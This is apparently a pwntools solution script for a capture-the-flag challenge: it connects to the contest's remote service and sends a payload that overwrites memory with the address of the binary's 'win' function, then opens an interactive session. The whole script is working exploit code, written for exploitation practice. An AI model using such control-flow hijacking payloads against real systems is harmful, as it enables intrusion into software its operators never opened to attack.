from pwn import *

# p = process('./chall')
p = remote('chall.live.ctf.tsg.ne.jp', 30006)
e = ELF('./chall')

p.sendline(b'32'.ljust(8, b'\0')+p64(e.symbols['win'])*3)
p.interactive()
